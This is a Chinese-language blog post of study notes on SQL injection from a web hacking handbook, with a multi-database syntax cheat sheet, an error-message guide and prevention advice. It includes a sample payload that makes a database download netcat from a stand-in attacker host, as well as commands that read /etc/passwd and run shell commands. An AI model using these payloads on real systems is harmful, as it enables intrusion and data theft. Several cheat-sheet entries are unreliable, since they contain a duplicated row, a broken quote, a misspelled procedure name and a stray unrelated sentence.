---
layout:     post
title:      Chapter 9 Attacking Data Stores(2)-Injecting into SQL(5)
subtitle:   SQL注入(5)
date:       2020-03-15
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 9

# 1.SQL语法和错误参考(SQL Syntax and Error Reference)

我们描述了许多技术，使您可以探查和利用Web应用程序中的SQL注入漏洞。 在许多情况下，您需要对不同的后端数据库平台使用的语法之间存在细微的差异。 此外，每个数据库都会产生不同的错误消息，在探查缺陷和尝试进行有效利用时，您都需要了解其含义。 以下页面包含简短的备忘单，您可以使用该备忘单查找特定任务所需的确切语法，并破译遇到的任何不熟悉的错误消息。

## 1.1 SQL Syntax

|Requirement:|ASCII and SUBSTRING|
|-|-|
|Oracle:|ASCII('A') is equal to 65<br>SUBSTR('ABCDE',2,3) is equal to BCD|
|MS-SQL:|ASCII('A') is equal to 65<br>SUBSTRING('ABCDE',2,3) is equal to BCD|
|MySQL:|ASCII('A') is equal to 65<br>ASCII('A') is equal to 65|

|Requirement:|Retrieve current database user|
|-|-|
|Oracle:|Select Sys.login_user from dual SELECT user FROM dual SYS_CONTEXT('USERENV','SESSION_USER')|
|MS-SQL:|select suser_sname()|
|MySQL:|SELECT user()|

|Requirement:|Cause a time delay|
|-|-|
|Oracle:|Utl_Http.request('http://madeupserver.com')|
|MS-SQL:|waitfor delay '0:0:10'<br>exec master..xp_cmdshell 'ping localhost'|
|MySQL:|sleep(100)|

|Requirement:|Retrieve database version string|
|-|-|
|Oracle:|select banner from v$version|
|MS-SQL:|select @@version|
|MySQL:|select @@version|

|Requirement:|Retrieve current database|
|-|-|
|Oracle:|SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual|
|MS-SQL:|SELECT db_name()<br>**The server name can be retrieved using:**<br>SELECT @@servername|
|MySQL:|SELECT database()|

|Requirement:|Retrieve current user's privilege|
|-|-|
|Oracle:|SELECT privilege FROM session_privs|
|MS-SQL:|SELECT grantee, table_name, privilege_type FROM<br>INFORMATION_SCHEMA.TABLE_PRIVILEGES|
|MySQL:|SELECT * FROM information_schema.user_privileges WHERE grantee = '[user]' where [user] is determined from the output of SELECT user()|

|Requirement:|Show all tables and columns in a single column of results|
|-|-|
|Oracle:|Select table_name\|\|''\|\|column_name from all_tab_columns|
|MS-SQL:|SELECT table_name+''+column_name from information_schema.columns|
|MySQL:|SELECT CONCAT(table_name,',column_name) from information_schema.columns|

|Requirement:|Show user objects|
|-|-|
|Oracle:|SELECT object_name, object_type FROM user_objects|
|MS-SQL:|SELECT name FROM sysobjects|
|MySQL:|SELECT table_name FROM information_schema.tables(or trigger_name from information_schema.triggers, etc.)|

|Requirement:|Show user tables|
|-|-|
|Oracle:|SELECT object_name, object_type FROM user_objects WHERE object_type='TABLE'<br>Or to show all tables to which the user has access:<br>SELECT table_name FROM all_tables|
|MS-SQL:|SELECT name FROM sysobjects WHERE xtype='U'|
|MySQL:|SELECT table_name FROM information_schema.tables where table_type='BASE TABLE' and table_schema!='mysql'|

|Requirement:|Show column names for table foo|
|-|-|
|Oracle:|SELECT column_name, name FROM user_tab_columns WHERE table_name = 'FOO'<br>Use the ALL_tab_columns table if the target data is not owned by the current application user.|
|MS-SQL:|SELECT column_name FROM information_schema.columns WHERE table_name='foo'|
|MySQL:|SELECT column_name FROM information_schema.columns WHERE table_name='foo'|

|Requirement:|Interact with the operating system (simplest ways)|
|-|-|
|Oracle:|See The Oracle Hacker's Handbook by David Litchfield|
|MS-SQL:|EXEC xp_cmshell 'dir c:\ '|
|MySQL:|SELECT load_file('/etc/passwd')|

## 1.2 SQL Error Messages

|SQL|Error Messages|
|-|-|
|Oracle:|The Sega Saturn "Security" in a nutshell, sorry for the huge blob of text.<br>ORA-00933: SQL command not properly ended|
|MS-SQL:|Msg 170, Level 15, State 1, Line 1<br>Line 1: Incorrect syntax near 'foo'<br>Msg 105, Level 15, State 1, Line 1<br>Unclosed quotation mark before the character string 'foo'|
|MySQL:|You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near ''foo' at line X|
|Translation:|对于Oracle和MS-SQL，存在SQL注入，并且几乎可以肯定它可以被利用！ 如果您输入单引号并更改了数据库查询的语法，则这是您期望的错误。 对于MySQL，可能存在SQL注入，但是在其他上下文中可能会出现相同的错误消息。|

|SQL|Error Messages|
|-|-|
|Oracle:|PLS-00306: wrong number or types of arguments in call to 'XXX'|
|MS-SQL:|Procedure 'XXX' expects parameter '@YYY', which was not supplied|
|MySQL:|N/A|
|Translation:|您已注释掉或删除了通常会提供给数据库的变量。 在MS-SQL中，您应该能够使用时间延迟技术来执行任意数据检索。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-01789: query block has incorrect number of result columns|
|MS-SQL:|Msg 205, Level 16, State 1, Line 1<br>All queries in a SQL statement containing a UNION<br>operator must have an equal number of expressions in<br>their target lists.|
|MySQL:|The used SELECT statements have a different number of columns|
|Translation:|尝试进行UNION SELECT攻击时，您会看到此消息，并且为原始SELECT语句中的数字指定了不同的列数。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-01790: expression must have same datatype as corresponding expression|
|MS-SQL:|Msg 245, Level 16, State 1, Line 1<br>Syntax error converting the varchar value 'foo' to a<br>Syntax error converting the varchar value 'foo' to a|
|MySQL:|(MySQL will not give you an error.)|
|Translation:|尝试进行UNION SELECT攻击时，您会看到此消息，并且您指定了与原始SELECT语句不同的数据类型。 尝试使用NULL或1或2000。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-01722: invalid number<br>ORA-01858: a non-numeric character was found where a<br>numeric was expected|
|MS-SQL:|Msg 245, Level 16, State 1, Line 1<br>Syntax error converting the varchar value 'foo' to a<br>column of data type int.|
|MySQL:|(MySQL will not give you an error.)|
|Translation:|您输入的内容与该字段的预期数据类型不匹配。<br>您可能有SQL注入，并且可能不需要单引号，所以尝试简单地输入一个数字，<br>然后在要注入的SQL后面输入。<br> 在MS-SQL中，您应该能够使用此错误消息返回任何字符串值。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-00923: FROM keyword not found where expected|
|MS-SQL:|N/A|
|MySQL:|N/A|
|Translation:|以下将在MS-SQL中工作`SELECT 1`,<br>但是在Oracle中，如果要返回某些内容，则必须从一张桌子。 DUAL表会很好：<br>`SELECT 1 from DUAL`|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-00936: missing expression|
|MS-SQL:|Msg 156, Level 15, State 1, Line 1Incorrect syntax<br>near the keyword 'from'.|
|MySQL:|You have an error in your SQL syntax. Check the<br>manual that corresponds to your MySQL server version<br>for the right syntax to use near ' XXX , YYY from<br>SOME_TABLE' at line 1|
|Translation:|当注入点位于FROM关键字之前（例如，已注入到要返回的列中）和/或已使用注释字符删除了必需的SQL关键字时，通常会看到此错误消息。 尝试在使用注释字符时自己完成SQL语句。 遇到这种情况时，MySQL应该有助于显示列名XXX，YYY。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-00972:identifier is too long|
|MS-SQL:|String or binary data would be truncated.|
|MySQL:|N/A|
|Translation:|这并不表示SQL注入。 如果您输入了一个长字符串，您可能会看到此错误消息。 您也不大可能在这里溢出缓冲区，因为数据库正在安全地处理您的输入。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-00942: table or view does not exist|
|MS-SQL:|Msg 208, Level 16, State 1, Line 1<br>Invalid object name 'foo'|
|MySQL:|Table 'DBNAME.SOMETABLE' doesn't exist|
|Translation:|您正在尝试访问不存在的表或视图，或者对于Oracle，数据库用户没有对该表或视图的特权。 针对您知道可以访问的表（例如DUAL）测试查询。 遇到这种情况时，MySQL应该有助于揭示当前的数据库模式DBNAME。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-00920: invalid relational operator|
|MS-SQL:|Msg 170, Level 15, State 1, Line 1<br>Line 1: Incorrect syntax near foo|
|MySQL:|You have an error in your SQL syntax. Check the<br>manual that corresponds to your MySQL server version<br>for the right syntax to use near '' at line 1|
|Translation:|您可能正在更改WHERE子句中的某些内容，并且您的SQL注入尝试破坏了语法。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-00907: missing right parenthesis|
|MS-SQL:|N/A|
|MySQL:|You have an error in your SQL syntax. Check the<br>manual that corresponds to your MySQL server version<br>for the right syntax to use near '' at line 1|
|Translation:|您的SQL注入尝试已经成功，但是注入点位于括号内。 您可能用插入的注释字符（--）注释了右括号。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-00900: invalid SQL statement|
|MS-SQL:|Msg 170, Level 15, State 1, Line 1<br>Line 1: Incorrect syntax near foo|
|MySQL:|You have an error in your SQL syntax. Check the<br>manual that corresponds to your MySQL server version<br>for the right syntax to use near XXXXXX|
|Translation:|一般错误消息。 先前列出的错误消息均优先，因此其他地方出了问题。 您很可能可以尝试其他输入方式，并获得更有意义的信息。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-03001: unimplemented feature|
|MS-SQL:|N/A|
|MySQL:|N/A|
|Translation:|您试图执行Oracle不允许的操作。 如果您试图显示来自v $ version的数据库版本字符串，但是您处于UPDATE或INSERT查询中，则可能会发生这种情况。|

|SQL|Error Messages|
|-|-|
|Oracle:|ORA-02030: can only select from fixed tables/views|
|MS-SQL:|N/A|
|MySQL:|N/A|
|Translation:|您可能正在尝试编辑SYSTEM视图。 如果您试图显示来自v $ version的数据库版本字符串，但是您处于UPDATE或INSERT查询中，则可能会发生这种情况。|

# 2.防止SQL注入(Preventing SQL Injection)

尽管SQL注入具有各种不同的表现形式，并且在利用过程中可能会产生复杂性，但它通常是易于预防的漏洞之一。尽管如此，有关SQL注入对策的讨论经常会误导人们，许多人仅依赖防御性措施 部分有效。

## 2.1 部分有效措施(Partially Effective Measures)

由于在SQL注入漏洞的标准说明中单引号非常突出，因此一种防止攻击的常用方法是通过将用户输入中的任何单引号加倍来对其进行转义。 您已经看到了两种情况下该方法失败的情况：
- 如果将用户提供的数字数据嵌入到SQL查询中，则通常不会将其封装在单引号中。 因此，（继续）攻击者可以突破数据上下文并开始输入任意SQL，而无需提供单引号。
- 在二阶SQL注入攻击中，最初从数据库中读取时已安全转义的数据随后从数据库中读取，然后再次传递回数据库。 重用数据时，最初加倍的引号会恢复为其原始格式。
通常引用的另一种对策是对所有数据库访问使用存储过程。 毫无疑问，自定义存储过程可以提供安全性和性能优势。 但是，由于两个原因，不能保证它们可以防止SQL注入漏洞：
- 正如您在Oracle案例中所看到的，写得不好的存储过程可能在其自己的代码中包含SQL注入漏洞。 在存储过程中构造SQL语句时，也会出现类似的安全性问题。 使用存储过程的事实并不能防止错误的发生。
- 即使使用了健壮的存储过程，如果使用用户提供的输入以不安全的方式调用SQL注入漏洞，也可能会产生SQL注入漏洞。 例如，假设用户注册功能是在存储过程中实现的，该存储过程的调用方式如下：
```
exec sp_RegisterUser 'joe', 'secret'
```
该语句可能与简单的INSERT语句一样容易受到攻击，例如，攻击者可能会提供以下密码：
```
foo'; exec master..xp_cmdshell 'tftp wahh-attacker.com GET nc.exe'--
```
这将导致应用程序执行以下批查询：
```
exec sp_RegisterUser 'joe', 'foo'; exec master..xp_cmdshell 'tftp
wahh-attacker.com GET nc.exe'--'
```
因此，使用存储过程什么都没有做。<br>
实际上，在执行成千上万条不同SQL语句的大型复杂应用程序中，许多开发人员将重新实现这些语句作为存储过程的解决方案视为开发时间的不合理开销。

## 2.2 参数化查询(Parameterized Queries)

大多数数据库和应用程序开发平台都提供了用于以安全方式处理不受信任的输入的API，可以防止出现SQL注入漏洞。 在参数化查询（也称为预处理语句）中，包含用户输入的SQL语句的构造分两个步骤执行：
- 1.该应用程序指定查询的结构，为用户输入的每一项保留占位符。
- 2.该应用程序指定每个占位符的内容。

至关重要的是，在第二步中指定的预制数据无法干扰在第一步中指定的查询的结构。 由于查询结构已经定义，因此相关的API以安全的方式处理任何类型的占位符数据，因此始终将其解释为数据，而不是语句结构的一部分。

下面的两个代码示例说明了根据用户数据动态构建的不安全查询与其安全参数化对应项之间的区别。 首先，用户提供的name参数直接嵌入到SQL语句中，使应用程序容易受到SQL注入的攻击：
```
//define the query structure
String queryText = "select ename,sal from emp where ename ='";

//concatenate the user-supplied name
queryText += request.getParameter("name");
queryText += "'";

// execute the query
stmt = con.createStatement();
rs = stmt.executeQuery(queryText);
```
在第二个示例中，使用问号作为用户提供的参数的占位符来定义查询结构。 调用prepareStatement方法来解释此内容，并固定要执行的查询的结构。 只有那时，才可以使用setString方法指定参数的实际值。 由于查询的结构已经固定，因此该值可以包含任何数据，而不会影响结构。 然后安全地执行查询：
```
//define the query structure
String queryText = "SELECT ename,sal FROM EMP WHERE ename = ?";

//prepare the statement through DB connection "con"
stmt = con.prepareStatement(queryText);

//add the user input to variable 1 (at the first ? placeholder)
stmt.setString(1, request.getParameter("name"));

// execute the query
rs = stmt.executeQuery();
```
**NOTE**
在数据库和应用程序开发平台之间，用于创建参数化查询的精确方法和语法是不同的。 有关最常见示例的更多详细信息，请参见第18章。

如果参数化查询是防止SQL注入的有效解决方案，则需要牢记一些重要的条件：
- 它们应用于每个数据库查询。作者遇到了许多应用程序，在这些应用程序中，开发人员分别判断是否使用参数化查询。如果明显使用了用户提供的输入，则应这样做；否则，他们不会打扰。这种方法已成为许多SQL注入漏洞的原因。首先，通过仅关注从用户立即收到的输入，很容易忽略二阶攻击，因为假定已经处理的数据是受信任的。其次，很容易在特定情况下犯错误，在这种情况下，要处理的数据是用户可控制的。在大型应用程序中，不同的数据项保存在会话中或从客户端接收。一个开发人员所做的假设可能不会传达给其他开发人员。将来，特定数据项的处理可能会发生变化，从而在以前安全的查询中引入了SQL注入漏洞。在整个应用程序中强制使用参数化查询的方法要安全得多。
- 插入查询的每一项数据都应进行适当的参数设置。作者遇到过很多情况，大多数查询的参数都得到了安全处理，但其中一到两项直接连接到用于指定查询结构的字符串中。 如果以这种方式处理某些参数，则使用参数化查询不会阻止SQL注入。
- 参数占位符不能用于指定查询中使用的表名和列名。 在极少数情况下，应用程序需要根据用户提供的数据在SQL查询中指定这些项目。 在这种情况下，最好的方法是使用已知良好值的白名单（数据库中实际使用的表和列的列表），并拒绝任何与此列表中的项目不匹配的输入。 如果不这样做，则应在用户输入上强制执行严格的验证-例如，仅允许字母数字字符（不包括空格），并强制执行适当的长度限制。
- 参数占位符不能用于查询的任何其他部分，例如出现在ORDER BY子句中的ASC或DESC关键字或任何其他SQL关键字，因为它们构成查询结构的一部分。与表名和列名一样， 如果有必要根据用户提供的数据指定这些项目，则应应用严格的白名单验证以防止受到攻击。

## 2.3 深度防御(Defense in Depth)

与往常一样，一种可靠的安全方法应采用纵深防御措施，以在前线防御由于任何原因而失败的情况下提供额外的保护。 在针对后端数据库的攻击中，可以采用三层进一步的防御措施：
- 在访问数据库时，应用程序应使用尽可能低的特权级别。 通常，应用程序不需要DBA级权限。 它通常只需要读取和写入自己的数据即可。 在对安全至关重要的情况下，应用程序可以使用不同的数据库帐户来执行不同的操作。 例如，如果90％的数据库查询仅需要读访问权限，则可以使用没有写权限的帐户来执行这些操作。 如果特定查询仅需要读取数据的子集（例如，订单表而不是用户帐户表），则可以使用具有相应访问级别的帐户。 如果在整个应用程序中强制采用此方法，则可能存在的任何残留SQL注入漏洞都可能会大大降低其影响。
- 许多企业数据库都包含大量的默认功能，攻击者可以利用这些默认功能来执行任意SQL语句。 尽可能删除或禁用不必要的功能。 即使在某些情况下，熟练且果断的攻击者可能可以通过其他方式重新创建某些必需的功能，但此任务通常并不简单，并且数据库加固仍将在攻击者的路径上设置重大障碍。
- 应该及时评估，测试和应用所有供应商发布的安全补丁，以修复数据库软件本身中的已知漏洞。 在安全性至关重要的情况下，数据库管理员可以使用各种基于订户的服务来获取有关尚未由供应商修补的某些已知漏洞的预先通知。 他们可以在此期间实施适当的变通措施。

[Chapter 9 Attacking Data Stores(2)-Injecting into SQL(4)](https://dm116.github.io/2020/03/15/attacking-data-stores_2_4/)<br>
[Chapter 9 Attacking Data Stores(3)-Injecting into NoSQL](https://dm116.github.io/2020/03/15/attacking-data-stores_3/)<br>
